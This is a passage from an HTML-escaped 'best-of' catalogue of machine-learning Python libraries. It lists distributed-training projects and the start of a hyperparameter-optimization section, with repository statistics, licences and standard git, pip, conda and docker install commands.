src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PyTorchLightning/metrics&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 180 · 📥 660 · 📦 3K · 📋 370 - 16% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PyTorchLightning/metrics&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/metrics&#34;&gt;PyPi&lt;/a&gt; (📥 3.2K / month · 📦 14 · ⏱️ 28.04.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install metrics&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/torchmetrics&#34;&gt;Conda&lt;/a&gt; (📥 350K · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge torchmetrics&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dask/dask-ml&#34;&gt;dask-ml&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 800) - Scalable Machine Learning with Dask. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dask/dask-ml&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 73 · 🔀 220 · 📦 620 · 📋 470 - 48% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dask/dask-ml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dask-ml&#34;&gt;PyPi&lt;/a&gt; (📥 86K / month · 📦 55 · ⏱️ 22.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dask-ml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dask-ml&#34;&gt;Conda&lt;/a&gt; (📥 320K · ⏱️ 22.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dask-ml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/yahoo/TensorFlowOnSpark&#34;&gt;TensorFlowOnSpark&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 3.8K) - TensorFlowOnSpark brings TensorFlow programs to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/yahoo/TensorFlowOnSpark&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 34 · 🔀 970 · 📋 360 - 1% open · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/yahoo/TensorFlowOnSpark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflowonspark&#34;&gt;PyPi&lt;/a&gt; (📥 550K / month · 📦 5 · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflowonspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorflowonspark&#34;&gt;Conda&lt;/a&gt; (📥 10K · ⏱️ 27.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorflowonspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/SynapseML&#34;&gt;SynapseML&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 3.3K) - Simple and Distributed Machine Learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/SynapseML&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 92 · 🔀 670 · 📋 580 - 42% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/SynapseML&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/synapseml&#34;&gt;PyPi&lt;/a&gt; (📥 32K / month · 📦 1 · ⏱️ 12.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install synapseml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/uber/petastorm&#34;&gt;petastorm&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.4K) - Petastorm library enables single machine or distributed training.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/uber/petastorm&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 44 · 🔀 240 · 📥 310 · 📦 70 · 📋 280 - 50% open · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/uber/petastorm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/petastorm&#34;&gt;PyPi&lt;/a&gt; (📥 86K / month · 📦 6 · ⏱️ 19.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install petastorm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/maxpumperla/elephas&#34;&gt;Elephas&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1.5K) - Distributed Deep learning with Keras &amp;amp; Spark. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;keras&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/maxpumperla/elephas&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 300 · 📦 56 · 📋 160 - 11% open · ⏱️ 30.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/maxpumperla/elephas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/elephas&#34;&gt;PyPi&lt;/a&gt; (📥 92K / month · 📦 3 · ⏱️ 30.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install elephas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/elephas&#34;&gt;Conda&lt;/a&gt; (📥 8.1K · ⏱️ 02.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge elephas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/mesh&#34;&gt;Mesh&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1.3K) - Mesh TensorFlow: Model Parallelism Made Easier. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/mesh&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 48 · 🔀 220 · 📦 680 · 📋 110 - 87% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/mesh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mesh-tensorflow&#34;&gt;PyPi&lt;/a&gt; (📥 22K / month · 📦 32 · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mesh-tensorflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mpi4py/mpi4py&#34;&gt;mpi4py&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 540) - Python bindings for MPI. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mpi4py/mpi4py&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 77 · 📥 4.8K · 📋 77 - 16% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mpi4py/mpi4py&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mpi4py&#34;&gt;PyPi&lt;/a&gt; (📥 180K / month · 📦 580 · ⏱️ 15.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mpi4py&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mpi4py&#34;&gt;Conda&lt;/a&gt; (📥 1.1M · ⏱️ 04.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mpi4py&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/intel-analytics/analytics-zoo&#34;&gt;analytics-zoo&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 2.5K) - Distributed Tensorflow, Keras and PyTorch on Apache.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/intel-analytics/analytics-zoo&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 710 · 📦 3 · 📋 1.4K - 39% open · ⏱️ 29.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/intel-analytics/analytics-zoo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/analytics-zoo&#34;&gt;PyPi&lt;/a&gt; (📥 4K / month · 📦 1 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install analytics-zoo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/SynapseML&#34;&gt;MMLSpark&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 3.3K) - Simple and Distributed Machine Learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/SynapseML&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 92 · 🔀 670 · 📋 580 - 42% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/SynapseML&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mmlspark&#34;&gt;PyPi&lt;/a&gt; (📥 3 / month · ⏱️ 18.03.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mmlspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/apache/singa&#34;&gt;Apache Singa&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 2.6K) - a distributed deep learning platform. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/apache/singa&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 79 · 🔀 790 · 📦 1 · 📋 97 - 41% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/apache/singa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/nusdbsystem/singa&#34;&gt;Conda&lt;/a&gt; (📥 460 · ⏱️ 09.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c nusdbsystem singa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/apache/singa&#34;&gt;Docker Hub&lt;/a&gt; (📥 280 · ⭐ 4 · ⏱️ 04.06.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull apache/singa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookincubator/submitit&#34;&gt;Submit it&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 620) - Python 3.6+ toolbox for submitting jobs to Slurm. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookincubator/submitit&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 63 · 📋 66 - 31% open · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookincubator/submitit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/submitit&#34;&gt;PyPi&lt;/a&gt; (📥 21K / month · 📦 6 · ⏱️ 07.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install submitit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/submitit&#34;&gt;Conda&lt;/a&gt; (📥 6K · ⏱️ 10.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge submitit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/learning-at-home/hivemind&#34;&gt;Hivemind&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 1K) - Decentralized deep learning in PyTorch. Built to train models on thousands.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/learning-at-home/hivemind&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 61 · 📦 7 · 📋 120 - 35% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/learning-at-home/hivemind&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hivemind&#34;&gt;PyPi&lt;/a&gt; (📥 4.1K / month · 📦 1 · ⏱️ 20.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hivemind&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bytedance/byteps&#34;&gt;BytePS&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 3.2K) - A high performance and generic framework for distributed DNN training. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bytedance/byteps&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 450 · 📋 260 - 38% open · ⏱️ 10.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bytedance/byteps&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/byteps&#34;&gt;PyPi&lt;/a&gt; (📥 56 / month · ⏱️ 02.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install byteps&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/bytepsimage/tensorflow&#34;&gt;Docker Hub&lt;/a&gt; (📥 1.3K · ⏱️ 03.03.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull bytepsimage/tensorflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kingoflolz/mesh-transformer-jax&#34;&gt;mesh-transformer-jax&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 4.1K) - Model parallel transformers in JAX and Haiku. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/kingoflolz/mesh-transformer-jax&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 23 · 🔀 530 · 📋 170 - 12% open · ⏱️ 28.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/kingoflolz/mesh-transformer-jax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tunib-ai/parallelformers&#34;&gt;parallelformers&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 460) - Parallelformers: An Efficient Model Parallelization.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tunib-ai/parallelformers&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4 · 🔀 28 · 📦 7 · 📋 18 - 38% open · ⏱️ 02.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tunib-ai/parallelformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/parallelformers&#34;&gt;PyPi&lt;/a&gt; (📥 190 / month · ⏱️ 29.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install parallelformers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 8 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/DEAP/deap&#34;&gt;DEAP&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 4.7K) - Distributed Evolutionary Algorithms in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/37RvQcA&#34;&gt;❗️LGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/launchpad&#34;&gt;launchpad&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 270) - Launchpad is a library that simplifies writing distributed.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/databricks/tensorframes&#34;&gt;TensorFrames&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 760 · 💀) - [DEPRECATED] Tensorflow wrapper for DataFrames on.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Ibotta/sk-dist&#34;&gt;sk-dist&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 280 · 💤) - Distributed scikit-learn meta-estimators in PySpark. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/peterwittek/somoclu&#34;&gt;somoclu&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 240 · 💤) - Massively parallel self-organizing maps: accelerate training on.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/uber/fiber&#34;&gt;Fiber&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 970 · 💀) - Distributed Computing for AI Made Simple. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ml-tooling/lazycluster&#34;&gt;LazyCluster&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 43 · 💤) - Distributed machine learning made simple. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/petuum/autodist&#34;&gt;autodist&lt;/a&gt;&lt;/b&gt; (🥉11 · ⭐ 120 · 💀) - Simple Distributed Deep Learning on TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Hyperparameter Optimization &amp;amp; AutoML&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for hyperparameter optimization, automl and neural architecture search.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/optuna/optuna&#34;&gt;Optuna&lt;/a&gt;&lt;/b&gt; (🥇39 · ⭐ 6.4K · 📈) - A hyperparameter optimization framework. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/optuna/optuna&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 200 · 🔀 700 · 📦 3.3K · 📋 1.2K - 11% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/optuna/optuna&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; 